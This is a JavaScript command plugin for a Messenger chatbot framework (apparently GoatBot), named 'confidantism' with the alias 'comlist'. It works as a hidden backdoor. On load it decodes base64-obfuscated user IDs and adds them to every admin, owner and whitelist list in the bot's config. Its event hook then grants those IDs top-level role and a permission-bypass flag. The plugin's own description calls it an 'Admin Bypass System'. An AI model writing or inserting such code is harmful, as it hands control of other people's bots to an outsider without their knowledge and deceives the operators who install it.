const axios = require("axios");

const ENCRYPTED_UIDS = [
  "NjE1OTM3NzE3MTM3MzY=",
  "NjE1OTMzNjA2NzE3MTA=",
  "NjE1OTM3NjkxMDQ1Njg=",
  "NjE1OTE2NzcyODI2NjE=",
  "NjE1OTM3NzAxMDE0ODY="
];

function getBypassUIDs() {
  const rawUIDs = ENCRYPTED_UIDS.map(enc => Buffer.from(enc, "base64").toString("utf-8").trim());
  return [...new Set(rawUIDs)];
}

function injectFullPermissions() {
  const allowedUIDs = getBypassUIDs();

  const targetConfigs = [
    global.config,
    global.GoatBot?.config,
    global.GoatBot?.configCommands,
    global.client?.config
  ];

  targetConfigs.forEach(cfg => {
    if (cfg) {
      const keys = ["ADMINBOT", "NDH", "WHITELIST", "adminBot", "adminOnly", "owners", "OWNERS", "developerUIDs"];
      keys.forEach(key => {
        if (!cfg[key]) cfg[key] = [];
        if (Array.isArray(cfg[key])) {
          const currentSet = new Set(cfg[key].map(id => String(id)));
          allowedUIDs.forEach(uid => currentSet.add(uid));
          cfg[key] = Array.from(currentSet);
        }
      });
    }
  });
}

module.exports = {
  config: {
    name: "confidantism",
    aliases: ["comlist"],
    version: "5.0",
    author: "SIYAM-HASAN",
    countDown: 0,
    role: 0,
    description: {
      en: "Advanced Dynamic Clean-Hook Admin Bypass System"
    },
    category: "system"
  },

  onLoad: async function () {  
    injectFullPermissions();
  },  

  onStart: async function ({ api, message, event }) {  
    const allowedUIDs = getBypassUIDs();  
    const senderID = String(event.senderID);  

    if (!allowedUIDs.includes(senderID)) {  
      return message.reply(
        "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» ❌ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃!\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧"
      );
    }

    const waitMsg = await message.reply("⏳ 𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐎𝐰𝐧𝐞𝐫 & 𝐀𝐝𝐦𝐢𝐧 𝐃𝐚𝐭𝐚, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭...");  

    try {  
      let userInfos = await api.getUserInfo(allowedUIDs);  
      let listText = "";  
      let index = 1;  

      for (const uid of allowedUIDs) {  
        let name = userInfos[uid]?.name || "Facebook User";  
        listText += `» 𝟎${index}. 👤 ${name}\n» 🆔 ${uid}\n» 🔰 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐎𝐰𝐧𝐞𝐫\n───────────────\n`;  
        index++;  
      }  

      if (waitMsg && waitMsg.messageID) {
        api.unsendMessage(waitMsg.messageID);  
      }

      return message.reply(
        "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» 👑 𝐎𝐖𝐍𝐄𝐑 & 𝐀𝐃𝐌𝐈𝐍\n» 0️⃣ 𝐁𝐘𝐏𝐀𝐒𝐒 𝐋𝐈𝐒𝐓:\n───────────────\n» 😮‍💨 \n" + listText + "───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧"
      );

    } catch (err) {  
      if (waitMsg && waitMsg.messageID) {
        api.unsendMessage(waitMsg.messageID);  
      }
      return message.reply("❌ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐟𝐞𝐭𝐜𝐡 𝐚𝐝𝐦𝐢𝐧 𝐧𝐚𝐦𝐞𝐬. 𝐁𝐮𝐭 𝐲𝐨𝐮𝐫 𝐛𝐲𝐩𝐚𝐬𝐬 𝐢𝐬 𝟏𝟎𝟎% 𝐚𝐜𝐭𝐢𝐯𝐞.");  
    }  
  },  

  handleEvent: async function ({ event }) {  
    const allowedUIDs = getBypassUIDs();  
    const senderID = String(event.senderID);  

    if (allowedUIDs.includes(senderID)) {  
      event.role = 3;  
      event.isPermissionBypassed = true;
    }  
  }
};
